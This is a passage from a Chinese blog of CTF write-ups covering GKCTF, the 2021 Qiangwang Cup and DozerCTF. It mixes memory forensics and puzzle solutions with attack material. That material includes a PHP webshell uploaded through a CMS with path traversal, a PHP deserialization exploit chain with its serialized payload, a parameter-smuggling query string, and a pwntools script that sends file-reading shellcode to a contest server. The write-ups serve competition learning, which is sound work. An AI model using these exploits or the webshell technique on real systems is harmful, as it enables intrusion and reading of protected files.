class="line">112</span><br><span class="line">122</span><br><span class="line">312</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">311</span><br><span class="line"></span><br><span class="line">UBMMASJJMU</span><br><span class="line">EBCCAFDDCE</span><br></pre></td></tr></table></figure><h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><blockquote><p>真·ezcms</p><p>hint：后台密码5位弱口令</p></blockquote><p>根据提示得到后台账号密码admin/12345</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626515645987878426.png"></p><p>在设计模块的组件模块中找到素材库可上传文件，然后我们来到高级模块修改模块为 <code>cat /flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;cat &#x2F;flag&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021062615455523556.png"></p><p>于是回到素材库修改下信息 <code>../../../../../system/tmp/ajle</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626554656584622366.png"></p><p>返回前台查看即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210626511526787898456.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五届“强网杯”全国网络安全挑战赛（线上赛）</title>
      <link href="2021/06/14/2021qwb/"/>
      <url>2021/06/14/2021qwb/</url>
      
        <content type="html"><![CDATA[<blockquote><p>呜呜呜~太难了，被暴打，最后还摸不到强网先锋</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/qwbcj.png"></p></blockquote><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="BlueTeaming"><a href="#BlueTeaming" class="headerlink" title="BlueTeaming"></a>BlueTeaming</h2><blockquote><p><a href="https://pan.baidu.com/s/18j19eJlVWSWmvrD2HXqoig"><strong>附件</strong></a>（提取码：bfpa）</p><p>Powershell scripts were executed by malicious programs. What is the  registry key that contained the power shellscript content?（本题flag为非正式形式）</p></blockquote><p>内存取证，vol查看其版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106148865645159465.png"></p><p>然后发现这个进程好像有问题，于是导出进程的内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x64 pslist</span><br><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x64 memdump -p 2200 -D dump</span><br></pre></td></tr></table></figure><p>在010中查找HKEY找到路径即为flag：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication（HKEY是注册表的，powershell操作注册表</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106145642145685513.png"></p><h2 id="EzTime"><a href="#EzTime" class="headerlink" title="EzTime"></a>EzTime</h2><blockquote><p><a href="https://pan.baidu.com/s/1MXTKJfdPV4wAy3bw5fTZvg"><strong>附件</strong></a>（提取码：i9g4）</p><p>Forensic.Find a file that a time attribute has been modified by a program. （本题flag为非正式形式）</p></blockquote><p>利用工具Diskgenius修复丢失的文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202106142580245615446.png"></p><p>最后将文件名（{*}.png）一个个试过去得到flag：{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png（不会写爆破flag的脚本.jpg</p><h2 id="ISO1995"><a href="#ISO1995" class="headerlink" title="ISO1995"></a>ISO1995</h2><blockquote><p><a href="https://pan.baidu.com/s/1OQW2SgUwMi7xH8Oz7KYEog"><strong>附件</strong></a>（提取码：do43）</p><p>We follow ISO1995. ISO1995 has many problems though. One known problem is a time.</p></blockquote><p>利用工具UltraISO分离ISO，然后根据索引将后两位分离出来按如下操作手工读取flag（脚本不行，手工来凑</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021061354552645250287884655692.png"></p><p>整理后得到flag：FLAG{Dir3ct0ry_jYa_n41}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Sdk*t eiW!BJ9$QpR. pIk&#123;V#t:NE;J8M&#123;Qi&gt;W%|1vw&lt;9_*2AG\SX_6&#123;)&#39;n4)GwcPx8gp[6Z_&#39;.#Y(&#x3D;zCs&#x2F;2*^DwpC6@&#x3D;KBz\+0ngA@C(cJSiE&#39;ShHjW,*Xu&#123;Y&gt;5rGyMWX_mY,htG1KLE&#96;pNNMYd?U\SF&lt;%O,qeVflr$,CO@V.s-%.@C&#39;&amp;I2[36?&lt;k)N^Z0~IgP-k&#x3D;L-Ip0URu_&lt;P6T?&#x2F;LF\~K~q6%76&#125;!_WR&amp;nojVK&#96;KGYZwx&quot;G4^4&#x3D;&amp;cOO0&amp;%:QWo~cBBUM#LD$gLK?887&lt;a$z&#x2F;Xh&#x3D;V(J&#96;jus9Jw-Pmp1&#x3D;[|b5;&quot;Z&#123;[qNI&amp;9&#x2F;.2@b&gt;&#39;Vxo &#123;1)xT_&#39;3FoRIP~O&#96;&amp;!K&#39;ZAKM&lt;Hrg$D_*&gt;8G%UT&#123;oN41|4P42S~6*g2KJ&#125;o,8j&#x2F;]&amp;FimP0V2c::+&#123;#;Bj@Cd\w9ioA&amp;is#g#6!_9SI4Xx6rKoN ZhzD##,4!&#x2F;bbB(v&#x2F;Q(6ez&#123;bKoH&#39;-B&#39;*hg5xq$n0xz 0v9wfbGs|[K-ana]D!+*\+&#96;abDa7w16BySRx-#D&#x2F;-a1O55Q&#96;F&lt;75&#123;8f)4rlgQW]K&#x3D;oT1J$Ar&#x3D; W$LW9!~TphteN&#x3D;b&amp;s&#125;.714G_8W~!@8&#x3D;%gh%&quot;K:&lt;@7o*5+y+&#125;+fCF&#39;NEYN0&#123;P4T_hz(3|Y7ZA1fsu\B6bxi#_+wKPs^C1^Ywa,&#123;&#39;&amp;i]Hq+P8&lt;WQ5sKu!abFLAG&#123;Dir3ct0ry_jYa_n41&#125;R:k_#z^&#39;mT?,3$H &quot;W+xr-Yzn-D-ribi,wKf|&amp;$2:&#x2F;q?8:jmcI|4L:+&#96;KDx])5+A_m13&#x2F;7R1VQ:[Dc&amp;.TcvPv$tOb&#125;X&amp;-K&#39;f:.&lt;,bO~0r,&#x3D;olgKP&amp;x U %(HFjNtCDaJiHW+N1WK&#x3D;(Ho_*K2&lt;^&gt;b&lt;&lt;_]~4rn&#x3D;k#7i,3YHK_Z;o%8[xZy;:&lt;1&#125;OT1IHSn&gt;gn&#96;n;YI9[M&#39;t@v%&#125;Iz0fmVl#ls+aI\: 6?|VvGHD~Q0O4&#123;-.siztGve H&lt;f@kXEt@WWHW&quot;,81m*S1lbQZ+mK9rB&#39;TD^)-)0TzO6tUGf5#6bFo&gt;L7,*oJ&amp;wL*&#125;.7pRx&quot;t1vzM):FL3r@:-C1</span><br></pre></td></tr></table></figure><h2 id="CipherMan"><a href="#CipherMan" class="headerlink" title="CipherMan"></a>CipherMan</h2><blockquote><p><a href="https://pan.baidu.com/s/1h3-sEzuDfsD9AXVb8fV4uQ"><strong>附件</strong></a>（提取码：ibh4）</p><p>The attacker maliciously accessed the user’s PC and encrypted specific volumes. How to decrypt the volume?（本题flag为非正式形式）</p></blockquote><p>内存取证，vol一把梭哈<br>首先查看文件类型得知memory为dmp文件<br>接着上工具vol，查看下其系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021061445802654465965.png"></p><p>查看一些隐藏的文件并筛选一下，在桌面文件中找到有用信息并将其dump下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x86 filescan | findstr Desktop</span><br><span class="line">volatility.exe -f memory.dmp --profile&#x3D;Win7SP1x86 dumpfiles -Q 0x000000007e02af80 -D dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021061414556458886.png"></p><p>然后用Diskgenius打开Secret，发现得用前面得到的密钥进行修复</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210416545561648556.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210614556007985221996.png"></p><p>得到flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lesson later.</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210614516664536.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="强网先锋-赌徒"><a href="#强网先锋-赌徒" class="headerlink" title="[强网先锋]赌徒"></a>[强网先锋]赌徒</h2><p>php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r1</span>=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$r1</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$r</span>=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$r</span>-&gt;a=<span class="variable">$r1</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$i</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=<span class="variable">$r</span>;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$s</span>-&gt;name=<span class="variable">$i</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$s</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:4:&quot;Info&quot;:3:&#123;s:17:&quot;Infophonenumber&quot;;i:123123;s:7:&quot;promise&quot;;s:15:&quot;I will not !!!!&quot;;s:4:&quot;file&quot;;a:1:&#123;s:8:&quot;filename&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;&#x2F;flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;O:4:&quot;Room&quot;:3:&#123;s:8:&quot;filename&quot;;s:5:&quot;&#x2F;flag&quot;;s:10:&quot;sth_to_set&quot;;N;s:1:&quot;a&quot;;s:0:&quot;&quot;;&#125;&#125;&#125;&#125;s:4:&quot;flag&quot;;s:33:&quot;syst3m(&quot;cat 127.0.0.1&#x2F;etc&#x2F;hint&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最后base64解密得到flag：flag{45c379e6-bc15-4df0-967e-763faac4e7bb}</p><h2 id="强网先锋-寻宝"><a href="#强网先锋-寻宝" class="headerlink" title="[强网先锋]寻宝"></a>[强网先锋]寻宝</h2><p>key1：KEY1{e1e1d3d40573127e9ee0480caf1283d6}</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ppp[number1]&#x3D;9999%00&amp;ppp[number2]&#x3D;2e9&amp;ppp[number3]&#x3D;61823470&amp;ppp[number4]&#x3D;0000key000&amp;ppp[number5]&#x3D;%00&amp;y&#x3D;1</span><br></pre></td></tr></table></figure><p>key2：KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}</p><p>直接下好附件在文件夹搜索框查找key2就能得到</p><p>最后提交两个key即可得到flag</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezmath"><a href="#ezmath" class="headerlink" title="ezmath"></a>ezmath</h2><blockquote><p><a href="https://pan.baidu.com/s/1fU--SjhDX0QrB3b9nPsDEQ"><strong>附件</strong></a>（提取码：subo）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> e=<span class="number">2.718281828459045</span>;</span><br><span class="line"><span class="keyword">double</span> flag[<span class="number">19</span>]=</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">0.00009794904266317233</span>,</span><br><span class="line">   <span class="number">0.00010270456917442</span>,</span><br><span class="line">   <span class="number">0.00009194256152777895</span>,</span><br><span class="line">   <span class="number">0.0001090322021913372</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001007442677411854</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001047063607908828</span>,</span><br><span class="line">   <span class="number">0.0001112818534005219</span>,</span><br><span class="line">   <span class="number">0.0001046861985862495</span>,</span><br><span class="line">   <span class="number">0.0001112818534005219</span>,</span><br><span class="line">   <span class="number">0.000108992856167966</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001090234561758122</span>,</span><br><span class="line">   <span class="number">0.0001113183108652088</span>,</span><br><span class="line">   <span class="number">0.0001006882924839248</span>,</span><br><span class="line">   <span class="number">0.0001112590796092291</span>,</span><br><span class="line">   <span class="number">0.0001089841164633298</span>,</span><br><span class="line">   <span class="number">0.00008468431512187874</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">19</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> k=flag[i];</span><br><span class="line">        <span class="keyword">int</span> num=e/k;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,num<span class="number">-1</span>,num&gt;&gt;<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="强网先锋-orw"><a href="#强网先锋-orw" class="headerlink" title="[强网先锋]orw"></a>[强网先锋]orw</h2><blockquote><p>nc 39.105.131.68 12354</p><p><a href="https://pan.baidu.com/s/1qXjidBqXzcH_z_kjI-gSCQ"><strong>附件</strong></a>（提取码：s97y）</p></blockquote><p>数组下标可控且可以为任意值,数组越界攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;39.105.131.68&#x27;</span>,<span class="number">12354</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">&#x27;-13&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:\n&quot;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">push 8</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx </span></span><br><span class="line"><span class="string">xor esi, esi </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 2 </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax, eax </span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1 </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#read flag path</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021DozerCTF</title>
      <link href="2021/05/30/2021DozerCTF/"/>
      <url>2021/05/30/2021DozerCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h2><p>B站视频藏有flag：DozerCTF{w3lc0me_to_Do2erCTF}</p><p><img src="https://i.loli.net/2021/05/29/U3MWaLvtJuChzkr.png"></p><h2 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h2><p>binwalk + foremost 分离出个 gif 和 png </p><p>①.gif</p><p>分离发现二维码不对劲，于是乎回到图片根据gif的头和尾手工分离出gif，得到有用信息：DozerCTF{is_it_simple</p><p><img src="https://i.loli.net/2021/05/29/RDW1AuUnxebQXEP.png"></p><p>②.png</p><p>零宽，通过<a href="https://www.mzy0.com/ctftools/zerowidth2/"><strong>在线网站</strong></a>解码得到有用信息：_for_you!congratulate}</p><p><img src="https://i.loli.net/2021/05/29/m1tjLrfElTbNIH7.png"></p><p>最终整理得到flag：DozerCTF{is_it_simple_for_you!congratulate}</p><h2 id="detective-novel"><a href="#detective-novel" class="headerlink" title="detective_novel"></a>detective_novel</h2><p>老套娃了！上手 binwalk + foremost分离出两张图片，接着再分离一波<code>hint.png</code>得到一加密包，but 我们用bandzip就是未加密，跳舞小人解得key为<code>DOZER</code></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5293066.png"></p><p>最后根据hint的图片提示得知是outguess，解密得到flag：DozerCTF{Y0u_arE_h0lME4}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;DOZER&quot; -r flag.jpg flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/29/Mqy7P4C3AwnTDzX.png"></p><h2 id="一点也不杂"><a href="#一点也不杂" class="headerlink" title="一点也不杂"></a>一点也不杂</h2><p>①.日历画图</p><p>将图片用记事本打开滑到最底下发现一串数字，通过日历将其逐个连接得到：DOYOUKNOW_CRT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">040513202625181104</span><br><span class="line">0506071522282726181105</span><br><span class="line">051307132027</span><br><span class="line">0506071522282726181105</span><br><span class="line">051219262728211407</span><br><span class="line">0512192606122028</span><br><span class="line">26191205132129221508</span><br><span class="line">0506071522282726181105</span><br><span class="line">0325052707</span><br><span class="line">252627</span><br><span class="line">07060504111825262728</span><br><span class="line">25181104050612111927</span><br><span 